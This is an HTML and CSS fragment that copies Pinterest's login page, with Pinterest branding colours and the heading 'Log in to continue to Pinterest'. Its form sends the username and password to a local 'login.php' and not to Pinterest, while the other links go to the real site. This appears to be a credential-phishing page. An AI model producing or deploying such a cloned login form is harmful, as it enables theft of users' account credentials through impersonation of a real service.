  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
    }

    body {
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      color: #000;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      padding: 40px 32px;
      text-align: center;
    }

    .logo {
      margin-bottom: 32px;
    }

    .pinterest-logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px; /* Lebih rapat */
    }

    .pinterest-icon {
      width: 48px;
      height: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .pinterest-icon svg {
      width: 48px;
      height: 48px;
    }

    .pinterest-text {
      font-family: "Poppins", sans-serif;
      font-weight: 700;
      font-size: 28px; /* sedikit diperkecil agar seimbang */
      letter-spacing: -0.02em;
      color: #e60023;
      text-decoration: none;
      line-height: 1;
      margin-top: -1px; /* fine-tune vertical alignment */
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      color: #000;
      text-align: center;
      margin-bottom: 24px;
      line-height: 1.4;
    }

    .form-group {
      margin-bottom: 16px;
      text-align: left;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      color: #333;
      margin-bottom: 8px;
      font-weight: 500;
    }

    .form-group input {
      width: 100%;
      padding: 12px 16px;
      border: 1px solid #d7d7d7;
      border-radius: 8px;
      font-size: 16px;
      outline: none;
      background: #fff;
      transition: border-color 0.2s;
    }

    .form-group input:focus {
      border-color: #e60023;
      box-shadow: 0 0 0 1px #e60023;
    }

    .btn-login {
      width: 100%;
      background: #e60023;
      color: white;
      border: none;
      border-radius: 24px;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s;
    }

    .btn-login:hover {
      background: #cc001e;
    }

    .divider {
      text-align: center;
      position: relative;
      margin: 24px 0;
      color: #777;
      font-size: 14px;
      line-height: 1;
    }

    .divider::before,
    .divider::after {
      content: "";
      position: absolute;
      top: 50%;
      width: 42%;
      height: 1px;
      background: #ddd;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .footer-links {
      text-align: center;
      font-size: 14px;
      color: #777;
      margin-top: 24px;
    }

    .footer-links a {
      color: #e60023;
      text-decoration: none;
      margin: 0 6px;
      display: inline-block;
      padding: 4px 0;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>

    <h1>Log in to continue to Pinterest</h1>

    <form action="login.php" method="POST">
      <div class="form-group">
        <label for="id">Email or username</label>
        <input type="text" id="id" name="id" required autocomplete="username" />
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" />
      </div>
      <button type="submit" class="btn-login">Log in</button>
    </form>

    <div class="divider">or</div>

    <div class="footer-links">
      <a href="https://www.pinterest.com/password/reset/" target="_blank">Forgot your password?</a>
      <a href="https://www.pinterest.com/_/_/signup/" target="_blank">Sign up</a>
    </div>
  </div>
